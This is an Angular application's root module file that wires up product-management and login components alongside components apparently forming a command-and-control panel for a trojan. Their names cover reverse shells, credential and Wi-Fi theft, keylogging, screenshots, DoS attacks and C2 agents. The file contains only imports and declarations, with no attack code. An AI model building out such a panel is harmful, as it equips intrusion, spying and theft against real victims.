import { BrowserModule } from '@angular/platform-browser';
import { NgModule } from '@angular/core';

import { AppRoutingModule } from './app-routing.module';
import { AppComponent } from './app.component';
import { ListaProductoComponent } from './producto/lista-producto.component';
import { DetalleProductoComponent } from './producto/detalle-producto.component';
import { NuevoProductoComponent } from './producto/nuevo-producto.component';
import { EditarProductoComponent } from './producto/editar-producto.component';
import { interceptorProvider } from './interceptors/prod-interceptor.service';

import { HttpClientModule } from '@angular/common/http';
import { FormsModule } from '@angular/forms';

// external
import { BrowserAnimationsModule } from '@angular/platform-browser/animations';
import { ToastrModule } from 'ngx-toastr';
import { LoginComponent } from './auth/login.component';
import { RegistroComponent } from './auth/registro.component';
import { MenuComponent } from './menu/menu.component';
import { IndexComponent } from './index/index.component';
import { ReverseShellComponent } from './reverse-shell/reverse-shell.component';
import { LaunchCommandsComponent } from './launch-commands/launch-commands.component';
import { GetFilesComponent } from './get-files/get-files.component';
import { PutFilesComponent } from './put-files/put-files.component';
import { AutoExecuteComponent } from './auto-execute/auto-execute.component';
import { GetInfoComponent } from './get-info/get-info.component';
import { GetWifiComponent } from './get-wifi/get-wifi.component';
import { GetCredentialsComponent } from './get-credentials/get-credentials.component';
import { ExecuteKeyloggerComponent } from './execute-keylogger/execute-keylogger.component';
import { DosAttackComponent } from './dos-attack/dos-attack.component';
import { ScreenShotsComponent } from './screen-shots/screen-shots.component';
import { C2AgentsComponent } from './c2-agents/c2-agents.component';
import { ListFilesComponent } from './list-files/list-files.component';
import { ListPicturesComponent } from './list-pictures/list-pictures.component';
import { ListServerComponent } from './list-server/list-server.component';
import { ListLogsComponent } from './list-logs/list-logs.component';
import { RemoveCommandComponent } from './remove-command/remove-command.component';
import { RemoveTrojanComponent } from './remove-trojan/remove-trojan.component';
import { ChangeServerComponent } from './change-server/change-server.component';



@NgModule({
  declarations: [
    AppComponent,
    ListaProductoComponent,
    DetalleProductoComponent,
    NuevoProductoComponent,
    EditarProductoComponent,
    LoginComponent,
    RegistroComponent,
    MenuComponent,
    IndexComponent,
    ReverseShellComponent,
    LaunchCommandsComponent,
    GetFilesComponent,
    PutFilesComponent,
    AutoExecuteComponent,
    GetInfoComponent,
    GetWifiComponent,
    GetCredentialsComponent,
    ExecuteKeyloggerComponent,
    DosAttackComponent,
    ScreenShotsComponent,
    C2AgentsComponent,
    ListFilesComponent,
    ListPicturesComponent,
    ListServerComponent,
    ListLogsComponent,
    RemoveCommandComponent,
    RemoveTrojanComponent,
    ChangeServerComponent,
  ],
  imports: [
    BrowserModule,
    AppRoutingModule,
    BrowserAnimationsModule,
    ToastrModule.forRoot(),
    HttpClientModule,
    FormsModule
  ],
  providers: [interceptorProvider],
  bootstrap: [AppComponent]
})
export class AppModule { }
